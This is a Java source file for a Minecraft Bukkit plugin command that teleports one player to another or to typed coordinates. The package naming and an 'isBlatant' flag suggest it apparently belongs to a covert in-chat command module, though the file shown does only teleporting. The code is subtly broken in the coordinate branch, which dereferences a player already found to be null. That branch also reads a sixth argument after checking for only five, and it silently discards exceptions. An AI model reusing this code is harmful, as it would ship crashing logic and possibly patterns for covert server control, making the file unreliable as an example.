
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;

import java.util.concurrent.ExecutionException;

import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;


public class TeleprotCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (args.length <= 1) {
            p2.sendMessage(Settings.USAGE("tp <player> <player>"));
        } else if (args.length == 2) {
            Player target = Bukkit.getServer().getPlayer(args[1]);
            if (target == null) {
                p2.sendMessage(Settings.PREFIX("The player " + Settings.RED + args[1] + Settings.WHITE + " is not online."));
            } else {
                Location tl2 = target.getLocation();
                plugin.getServer().getScheduler().runTaskAsynchronously((Plugin)plugin, () -> {
                    try {
                        Bukkit.getScheduler().callSyncMethod((Plugin)plugin, () -> p2.teleport(tl2)).get();
                    }
                    catch (InterruptedException | ExecutionException exception) {
                        
                    }
                });
                p2.sendMessage(Settings.PREFIX("You teleported to " + Settings.RED + target.getName()));
            }
        } else {
            Player targetTeleport = Bukkit.getServer().getPlayer(args[1]);
            Player targetTeleportTo = Bukkit.getServer().getPlayer(args[2]);
            if (targetTeleport == null) {
                if (args.length <= 4) {
                    p2.sendMessage(Settings.PREFIX("The player " + Settings.RED + args[1] + Settings.WHITE + " is not online."));
                } else {
                    double getX = Integer.parseInt(args[3]);
                    double getY = Integer.parseInt(args[4]);
                    double getZ = Integer.parseInt(args[5]);
                    Location loc = new Location(targetTeleport.getWorld(), getX, getY, getZ);
                    targetTeleport.teleport(loc);
                }
            } else if (targetTeleportTo == null) {
                p2.sendMessage(Settings.PREFIX("The player " + Settings.RED + args[2] + Settings.WHITE + " is not online."));
            } else {
                Location tl3 = targetTeleportTo.getLocation();
                plugin.getServer().getScheduler().runTaskAsynchronously((Plugin)plugin, () -> {
                    try {
                        Bukkit.getScheduler().callSyncMethod((Plugin)plugin, () -> targetTeleport.teleport(tl3)).get();
                    }
                    catch (InterruptedException | ExecutionException exception) {
                        
                    }
                });
                p2.sendMessage(Settings.PREFIX("You teleported " + targetTeleport.getName() + " to " + Settings.RED + targetTeleportTo.getName()));
            }
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }


}

